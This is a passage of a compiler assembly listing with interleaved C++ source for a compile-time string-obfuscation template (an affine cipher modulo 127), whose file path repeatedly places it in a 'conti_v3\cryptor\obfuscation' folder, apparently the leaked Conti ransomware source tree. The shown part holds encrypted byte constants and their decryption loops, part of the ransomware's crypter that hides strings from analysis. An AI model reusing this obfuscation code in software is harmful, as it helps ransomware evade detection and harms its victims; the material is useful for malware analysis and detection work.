  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 17	 mov	 BYTE PTR [rcx+1], 23
  00007	c6 41 02 1b	 mov	 BYTE PTR [rcx+2], 27
  0000b	c6 41 03 25	 mov	 BYTE PTR [rcx+3], 37	; 00000025H
  0000f	c6 41 04 1b	 mov	 BYTE PTR [rcx+4], 27
  00013	c6 41 05 6c	 mov	 BYTE PTR [rcx+5], 108	; 0000006cH
  00017	c6 41 06 1b	 mov	 BYTE PTR [rcx+6], 27
  0001b	c6 41 07 0e	 mov	 BYTE PTR [rcx+7], 14
  0001f	c6 41 08 1b	 mov	 BYTE PTR [rcx+8], 27
  00023	c6 41 09 17	 mov	 BYTE PTR [rcx+9], 23
  00027	c6 41 0a 1b	 mov	 BYTE PTR [rcx+10], 27
  0002b	c6 41 0b 1b	 mov	 BYTE PTR [rcx+11], 27
  0002f	c6 41 0c 1b	 mov	 BYTE PTR [rcx+12], 27
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 08 00 00
	00		 mov	 r11d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 74	 sub	 ecx, 116		; 00000074H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 32	 mov	 BYTE PTR [rcx+1], 50	; 00000032H
  00007	c6 41 02 74	 mov	 BYTE PTR [rcx+2], 116	; 00000074H
  0000b	c6 41 03 7d	 mov	 BYTE PTR [rcx+3], 125	; 0000007dH
  0000f	c6 41 04 74	 mov	 BYTE PTR [rcx+4], 116	; 00000074H
  00013	c6 41 05 7d	 mov	 BYTE PTR [rcx+5], 125	; 0000007dH
  00017	c6 41 06 74	 mov	 BYTE PTR [rcx+6], 116	; 00000074H
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 74	 mov	 BYTE PTR [rcx+8], 116	; 00000074H
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 12 00 00
	00		 mov	 r10d, 18
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6b 00 00 00	 mov	 eax, 107		; 0000006bH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7e	 mov	 BYTE PTR [rcx+1], 126	; 0000007eH
  00007	c6 41 02 6b	 mov	 BYTE PTR [rcx+2], 107	; 0000006bH
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 6b	 mov	 BYTE PTR [rcx+4], 107	; 0000006bH
  00013	c6 41 05 78	 mov	 BYTE PTR [rcx+5], 120	; 00000078H
  00017	c6 41 06 6b	 mov	 BYTE PTR [rcx+6], 107	; 0000006bH
  0001b	c6 41 07 4a	 mov	 BYTE PTR [rcx+7], 74	; 0000004aH
  0001f	c6 41 08 6b	 mov	 BYTE PTR [rcx+8], 107	; 0000006bH
  00023	c6 41 09 04	 mov	 BYTE PTR [rcx+9], 4
  00027	c6 41 0a 6b	 mov	 BYTE PTR [rcx+10], 107	; 0000006bH
  0002b	c6 41 0b 6c	 mov	 BYTE PTR [rcx+11], 108	; 0000006cH
  0002f	c6 41 0c 6b	 mov	 BYTE PTR [rcx+12], 107	; 0000006bH
  00033	c6 41 0d 11	 mov	 BYTE PTR [rcx+13], 17
  00037	c6 41 0e 6b	 mov	 BYTE PTR [rcx+14], 107	; 0000006bH
  0003b	c6 41 0f 49	 mov	 BYTE PTR [rcx+15], 73	; 00000049H
  0003f	c6 41 10 6b	 mov	 BYTE PTR [rcx+16], 107	; 0000006bH
  00043	c6 41 11 6b	 mov	 BYTE PTR [rcx+17], 107	; 0000006bH
  00047	c6 41 12 6b	 mov	 BYTE PTR [rcx+18], 107	; 0000006bH
  0004b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0004f	48 8b c1	 mov	 rax, rcx
  00052	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 54	 sub	 ecx, 84			; 00000054H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 59	 mov	 BYTE PTR [rcx+1], 89	; 00000059H
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 7d	 mov	 BYTE PTR [rcx+3], 125	; 0000007dH
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 0b	 mov	 BYTE PTR [rcx+5], 11
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 1b	 mov	 BYTE PTR [rcx+7], 27
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 43	 mov	 BYTE PTR [rcx+9], 67	; 00000043H
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	c6 41 0b 54	 mov	 BYTE PTR [rcx+11], 84	; 00000054H
  0002f	c6 41 0c 54	 mov	 BYTE PTR [rcx+12], 84	; 00000054H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 05	 sub	 ecx, 5

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
